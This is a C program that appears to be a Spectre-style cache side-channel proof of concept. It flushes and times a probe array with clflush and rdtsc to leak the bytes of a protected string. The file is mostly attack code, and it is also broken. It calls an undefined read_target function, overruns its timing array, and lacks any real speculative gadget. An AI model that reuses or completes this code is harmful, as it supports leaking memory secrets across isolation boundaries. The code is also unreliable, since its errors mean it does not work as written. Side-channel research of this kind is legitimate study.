#include <limits.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <x86intrin.h>

#define PROBE_SIZE 4096
#define CACHE_LINE 64

typedef unsigned long long ullong;

void clflush_len(void *addr, size_t len) {
  for (size_t i = 0; i <= len; i += CACHE_LINE) {
    _mm_clflush(addr + i);
  }
  _mm_mfence();
}

ullong probe(char *addr) {
  ullong t0, dt;
  char tmp;

  _mm_mfence();
  t0 = __rdtsc();
  tmp = *addr;
  _mm_mfence();
  dt = __rdtsc() - t0;
  _mm_mfence();

  return dt;
}

unsigned char analyze_probe_times(ullong *read_times) {
  const float threshold_coefficient = 0.5;

  ullong min = ULLONG_MAX;
  size_t min_idx = 0;

  for (size_t i = 1; i < UCHAR_MAX; i++) {
    if (read_times[i] < min) {
      min = read_times[i];
      min_idx = i;
    }
  }

  // 0 is always cached, so we need to compare
  // the min of non-zero probes to the zero case
  if (read_times[0] < min * threshold_coefficient) {
    // all probes were took significantly longer than 0
    return 0;
  } else {
    // shortest time was comparable/shorter to 0
    return min_idx;
  }
}

void main() {
  //
  unsigned char target[] = {
      "legal:protectedabcdefghijklmnopqrstuvwxyz012345678"};
  const size_t target_len = sizeof(target);

  // probe array
  unsigned char *probe_array = malloc(PROBE_SIZE * UCHAR_MAX);
  memset(probe_array, 0, PROBE_SIZE * UCHAR_MAX);

  // spectre sidechannel read data
  unsigned char *result = malloc(target_len);

  for (size_t i = 0; i < target_len; i++) {
    // probe array cache timings
    ullong read_times[UCHAR_MAX];

    // speculatively read data, test probe array[j], repeat
    for (int j = 0; j <= UCHAR_MAX; j++) {
      // remove probe_array from cache
      clflush_len(probe_array, PROBE_SIZE * UCHAR_MAX);

      // speculatively load part of probe array according to target
      unsigned char tmp;
      tmp = probe_array[PROBE_SIZE * read_target(i)];

      // get in/out of cache read time
      read_times[j] = probe(probe_array + j * PROBE_SIZE);
    }

    result[i] = analyze_probe_times(read_times);
  }

  /*








  */

  printf("\n");

  printf("Input:  ");
  for (size_t i = 0; i < target_len; i++) {
    printf("%1x ", target[i] & 0xff);
  }
  printf("\n");

  printf("Output: ");
  for (size_t i = 0; i < target_len; i++) {
    printf("%1x ", result[i] & 0xff);
  }
  printf("\n");

  printf("\n");

  printf("Input:  %s\n", target);
  printf("Output: %s\n", result);

  free(result);
  free(probe_array);
}
